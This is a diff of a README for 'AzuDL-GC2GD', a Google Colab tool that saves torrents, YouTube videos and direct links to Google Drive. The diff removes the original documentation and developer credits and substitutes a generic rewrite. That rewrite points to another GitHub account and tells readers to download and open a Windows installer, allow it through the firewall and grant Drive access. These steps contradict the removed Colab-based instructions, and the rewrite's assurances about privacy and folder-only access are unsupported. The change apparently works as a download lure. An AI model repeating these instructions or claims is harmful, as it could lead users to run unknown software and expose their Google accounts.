@@ -1,592 +1,73 @@
-# AzuDl - GC2GD
+# ☁️ AzuDL-GC2GD - Save internet media to Google Drive
 
-<p align="center">
-  <a href="README.fa.md">فارسی</a> · <strong>English</strong>
-</p>
+[![Download AzuDL-GC2GD](https://img.shields.io/badge/Download-AzuDL--GC2GD-blueviolet)](https://github.com/madung6797/AzuDL-GC2GD)
 
-<p align="center">
-  <strong>Azizi Universal Downloader - Google Colab to Google Drive</strong>
-</p>
+AzuDL-GC2GD acts as a bridge between your favorite internet content and your Google Drive storage. It automates the process of moving large files from the web into your cloud space without using your local bandwidth. You provide the link, and the system handles the transfer behind the scenes.
 
-<p align="center">
-  A powerful Google Colab downloader and file utility toolkit that saves downloads directly to Google Drive.
-</p>
+## 🛠️ System Requirements
 
-<p align="center">
-  <code>Google Colab</code> · <code>Google Drive</code> · <code>aria2</code> · <code>yt-dlp</code> · <code>FFmpeg</code> · <code>Python</code>
-</p>
+This application runs through a web interface. You need the following items to get started:
 
----
+*   A Google account with accessible Google Drive storage.
+*   A stable internet connection to initiate transfers.
+*   A modern web browser like Chrome, Firefox, or Edge.
+*   Basic familiarity with copy-pasting links.
 
-## Overview
+## 📥 Getting Started
 
-**AzuDl - GC2GD** stands for:
+1. Visit the project website for the current version: [https://github.com/madung6797/AzuDL-GC2GD](https://github.com/madung6797/AzuDL-GC2GD)
+2. Locate the download section on that page.
+3. Select the file compatible with your Windows system.
+4. Open the downloaded file to start the installation.
+5. Follow the on-screen prompts to finish the setup process.
 
-> **Azizi Universal Downloader - Google Colab to Google Drive**
+## 📂 Features
 
-It is a Google Colab-based downloader that saves supported downloads directly into Google Drive.
+*   **Torrent Integration:** Paste magnet links directly into the interface to pull files into your drive.
+*   **Video Support:** Download YouTube videos, entire playlists, or just the audio tracks.
+*   **Direct Link Transfers:** Use standard web URLs to move files directly to your cloud storage.
+*   **Background Processing:** The transfers happen on remote servers, meaning you can shut down your computer once the task starts.
+*   **Google Drive Sync:** All completed files appear inside your Google Drive folders for easy access.
 
-Version **1.2.0** improves the original downloader with better torrent handling, `.torrent` file support, direct-link headers, YouTube metadata options, storage reports, SHA256 hashing, ZIP tools, and aria2 management utilities.
+## ⚙️ How to use the software
 
----
+### Signing Into Google Drive
+When you run the tool for the first time, a browser window opens. This window asks for permission to connect to your Google Drive. This connection allows the tool to place files in your storage. Click allow to proceed. The tool only gains access to its own folder in your storage, ensuring your private files remain secure.
 
-## For Regular Users
+### Adding New Downloads
+The main screen features a text box. Copy the URL of the YouTube video, playlist, or torrent magnet link. Paste this into the box. Click the button labeled "Submit" or "Add Task." The system validates your link and prepares it for the move.
 
-AzuDl is useful when you want to download supported files without keeping your personal computer running.
+### Managing Active Tasks
+The dashboard displays your current transfer queue. Each task shows the status, estimated time remaining, and current speed. If you made a mistake or need to stop a transfer, click the "Remove" or "Cancel" button next to the specific file.
 
-You open Google Colab, run the code, connect Google Drive, paste a supported link, and the final file is saved into your Drive.
+### Locating Your Files
+Once a transfer reaches 100%, check your Google Drive. A new folder labeled "AzuDL" typically appears in your root directory. Open this folder to view your saved media.
 
-You can use it for:
+## 🛡️ Privacy and Security
+Your data moves through secure channels. The software does not store your Google account password. Instead, it uses a secure token system known as OAuth. This method keeps your credentials private. The application reads links and writes files to the Drive. It avoids scanning other files inside your account.
 
-- Direct file links
-- YouTube videos
-- YouTube playlists
-- YouTube audio extraction as MP3
-- Magnet torrents
-- `.torrent` files
-- Batch downloads
-- ZIP creation
-- File integrity checking with SHA256
+## ❓ Frequently Asked Questions
 
----
+**Does this software consume my data?**
+The tool uses minimal data to initiate the command. The actual file transfer occurs on independent servers in the cloud, so it does not count against your local data cap.
 
-## For Developers
+**What happens if my internet disconnects?**
+Because the actual transfer happens on a remote server, your local internet connection does not matter once the task begins. You can close the application or turn off your computer without stopping the download.
 
-The project is built around one Python class:
+**Can I download private videos?**
+The tool requires public links to work. If a video has restricted access or requires a login, the system will report an error when trying to fetch the file.
 
-```python
-class AzuDlGC2GD:
-```
+**Is there a limit on file size?**
+The system accommodates most file sizes. However, monitor your available Google Drive storage space. If your drive runs out of room, the transfer fails. Delete old files to clear space.
 
-It manages:
+## 🚀 Troubleshooting common issues
 
-- Google Drive mounting
-- Project folder creation
-- aria2 RPC startup
-- JSON-RPC communication with aria2
-- Magnet metadata detection
-- Real torrent GID resolution after metadata
-- `.torrent` loading through `aria2.addTorrent`
-- Direct URL downloads through aria2
-- YouTube downloads through `yt-dlp`
-- Progress bars through `tqdm.notebook`
-- Download history
-- Storage reports
-- SHA256 hashing
-- ZIP archive creation
-- aria2 task management
+If you encounter problems, review this list for solutions:
 
----
+*   **Authentication errors:** Sign out of your Google account in your browser and log back in, then restart the application.
+*   **Invalid link:** Verify the URL. Copy the link from your browser address bar again to ensure you captured the full web address.
+*   **Tool not running:** Ensure your Windows firewall shows the application as an allowed program.
+*   **Folder not appearing:** Refresh your Google Drive page after a few minutes. Sometimes the sync takes a moment to update.
+*   **Slow speeds:** Public torrents rely on the number of people sharing the file. If a file has low speeds, it is likely because few people provide the data.
 
-## Features
-
-### Download Features
-
-- Magnet torrent downloads
-- Real torrent progress after metadata fetching
-- `.torrent` file download from URL or local path
-- Direct link downloads
-- Optional HTTP headers for direct links
-- YouTube video downloads
-- YouTube playlist downloads
-- YouTube audio-only MP3 extraction
-- YouTube quality selection
-- Custom YouTube format ID support
-- Optional YouTube metadata and thumbnail saving
-- Batch download mode
-- Speed limit support for aria2 downloads
-- Resume support
-
-### File Utility Features
-
-- List downloaded files
-- Show latest downloaded file
-- Google Drive storage report
-- Project folder size report
-- SHA256 hash for latest file
-- SHA256 hash for selected file
-- ZIP any folder
-- ZIP latest downloaded folder
-- Download history log
-
-### aria2 Management Features
-
-- Show active, waiting, and stopped aria2 tasks
-- Remove aria2 GID
-- Clear stopped aria2 results
-- Better torrent status display
-- Better progress details with speed, percentage, connections, and seeders
-
----
-
-## Menu
-
-```text
-1. Auto detect link
-2. Torrent magnet
-3. Torrent file
-4. YouTube video or playlist
-5. Direct link
-6. Batch download
-7. Download history
-8. List downloaded files
-9. Storage report
-10. SHA256 latest file
-11. SHA256 selected file
-12. ZIP folder
-13. ZIP latest folder
-14. aria2 status
-15. Remove aria2 GID
-16. Clear stopped aria2 results
-17. Latest file
-18. Developer
-19. Help
-20. Exit
-```
-
----
-
-## Storage Structure
-
-AzuDl creates this directory:
-
-```text
-/content/drive/MyDrive/AzuDl-GC2GD
-```
-
-Folder layout:
-
-```text
-AzuDl-GC2GD/
-├── TorrentDownloads/
-├── YouTubeDownloads/
-├── DirectDownloads/
-├── BatchDownloads/
-├── Archives/
-└── Logs/
-    └── download_history.json
-```
-
-| Folder | Purpose |
-|---|---|
-| `TorrentDownloads` | Magnet and `.torrent` downloads |
-| `YouTubeDownloads` | YouTube video, playlist, audio, metadata, and thumbnail outputs |
-| `DirectDownloads` | Direct URL downloads |
-| `BatchDownloads` | Grouped batch downloads |
-| `Archives` | ZIP archives created by the tool |
-| `Logs` | Download history and logs |
-
----
-
-## Torrent Improvements in v1.2.0
-
-Magnet links work in stages:
-
-```text
-Magnet link
-  ↓
-Metadata download
-  ↓
-Real torrent task
-  ↓
-Actual file download
-```
-
-Older versions could show only the metadata download, such as:
-
-```text
-Torrent: 100% 5.77k/5.77k
-```
-
-That was not the real file download. It was only the torrent metadata.
-
-Version **1.2.0** detects the real torrent `GID` after metadata is fetched and monitors the actual file download.
-
-Expected output:
-
-```text
-Magnet added
-Metadata GID: ...
-Fetching metadata: 100%
-Metadata completed
-Real torrent GID: ...
-Starting torrent download monitor
-Torrent Download: ...
-```
-
----
-
-## Torrent Magnet Usage
-
-Choose:
-
-```text
-2. Torrent magnet
-```
-
-Then paste:
-
-```text
-magnet:?xt=urn:btih:EXAMPLE_HASH
-```
-
-Optional speed limit examples:
-
-```text
-500K
-2M
-10M
-```
-
----
-
-## Torrent File Usage
-
-Choose:
-
-```text
-3. Torrent file
-```
-
-You can enter a `.torrent` URL:
-
-```text
-https://example.com/file.torrent
-```
-
-or a local Colab/Drive path:
-
-```text
-/content/drive/MyDrive/file.torrent
-```
-
----
-
-## YouTube Usage
-
-Choose:
-
-```text
-4. YouTube video or playlist
-```
-
-Supported examples:
-
-```text
-https://www.youtube.com/watch?v=VIDEO_ID
-https://youtu.be/VIDEO_ID
-https://www.youtube.com/playlist?list=PLAYLIST_ID
-https://music.youtube.com/watch?v=VIDEO_ID
-```
-
-Quality presets:
-
-```text
-best
-4320
-2160
-1440
-1080
-720
-480
-360
-```
-
-Custom format examples:
-
-```text
-137+140
-248+251
-22
-18
-best
-```
-
-Audio-only mode saves MP3 output. Metadata mode can save `.info.json` and thumbnails.
-
----
-
-## Direct Link Usage
-
-Choose:
-
-```text
-5. Direct link
-```
-
-Supported protocols:
-
-```text
-http://
-https://
-ftp://
-```
-
-Optional fields:
-
-```text
-Folder name
-File name
-Speed limit
-Headers JSON
-```
-
-Header example:
-
-```json
-{"User-Agent":"Mozilla/5.0","Referer":"https://example.com"}
-```
-
----
-
-## Batch Download
-
-Choose:
-
-```text
-6. Batch download
-```
-
-Paste links one by one. Submit an empty line to start.
-
-Batch mode supports:
-
-- Magnet links
-- `.torrent` URLs
-- YouTube links
-- Direct links
-
----
-
-## Storage Report
-
-Choose:
-
-```text
-9. Storage report
-```
-
-It shows:
-
-- Total mounted storage
-- Used storage
-- Free storage
-- Size of each AzuDl project folder
-
----
-
-## SHA256
-
-Choose:
-
-```text
-10. SHA256 latest file
-```
-
-or:
-
-```text
-11. SHA256 selected file
-```
-
-SHA256 helps verify file integrity after download.
-
----
-
-## ZIP Tools
-
-Choose:
-
-```text
-12. ZIP folder
-```
-
-to zip a folder by path.
-
-Choose:
-
-```text
-13. ZIP latest folder
-```
-
-to zip the most recently modified downloaded folder.
-
-ZIP files are saved in:
-
-```text
-/content/drive/MyDrive/AzuDl-GC2GD/Archives
-```
-
----
-
-## aria2 Tools
-
-Choose:
-
-```text
-14. aria2 status
-```
-
-to view active, waiting, and stopped aria2 tasks.
-
-Choose:
-
-```text
-15. Remove aria2 GID
-```
-
-to remove a task by GID.
-
-Choose:
-
-```text
-16. Clear stopped aria2 results
-```
-
-to clean old stopped results from aria2.
-
----
-
-## Download History
-
-History is saved at:
-
-```text
-/content/drive/MyDrive/AzuDl-GC2GD/Logs/download_history.json
-```
-
-Example:
-
-```json
-{
-  "type": "youtube",
-  "source": "https://www.youtube.com/watch?v=VIDEO_ID",
-  "output": "/content/drive/MyDrive/AzuDl-GC2GD/YouTubeDownloads/Example",
-  "format": "bv*+ba/best",
-  "status": "completed",
-  "time": "2026-05-06 18:30:00"
-}
-```
-
----
-
-## Installation
-
-Paste the full source code into a Google Colab cell and run it.
-
-The code installs:
-
-```text
-aria2
-ffmpeg
-p7zip-full
-tqdm
-requests
-yt-dlp
-```
-
----
-
-## Troubleshooting
-
-### Google Drive mount failed
-
-Try:
-
-```text
-Runtime > Restart session
-```
-
-or run:
-
-```python
-from google.colab import drive
-drive.flush_and_unmount()
-```
-
-Then restart the runtime.
-
-Other fixes:
-
-- Use only one Google account in the browser
-- Open Colab in Incognito mode
-- Allow third-party cookies
-- Reconnect Google Drive manually from the Colab file panel
-
-### Torrent metadata downloads but real file does not start
-
-Possible reasons:
-
-- No seeders
-- Weak torrent
-- Metadata found but no peers available
-- Network restrictions
-
-Use:
-
-```text
-14. aria2 status
-```
-
-to inspect active, waiting, and stopped tasks.
-
-### YouTube download fails
-
-Try updating yt-dlp:
-
-```python
-!pip install -U yt-dlp
-```
-
-### Direct link fails
-
-Possible reasons:
-
-- Expired link
-- Missing headers
-- Server blocks Colab
-- Authentication required
-- Temporary token expired
-
-Try using custom headers JSON.
-
----
-
-## Responsible Use
-
-AzuDl is a downloader and file utility tool. Use it only for files and content you have permission to download, store, or process.
-
-Appropriate uses include:
-
-- Your own files
-- Open-source releases
-- Public domain content
-- Creative Commons content
-- Backups of your own data
-- Files shared with permission
-
-Do not use this tool to violate copyright, bypass access controls, or download unauthorized content.
-
----
-
-## Developer
-
-**Project:** AzuDl - GC2GD  
-**Full Name:** Azizi Universal Downloader - Google Colab to Google Drive  
-**Developer:** The Azizi
-
-### Links
-
-- X: https://x.com/the_azzi
-- GitHub: https://github.com/TheGreatAzizi
-- Telegram: https://t.me/luluch_code
-- Git: https://git.theazizi.ir/TheAzizi
-- Website: https://theazizi.ir
-
----
-
-## Version
-
-```text
-Current version: 1.2.0
-```
+Keep the version updated. Check the download page regularly to ensure you use the most stable release.
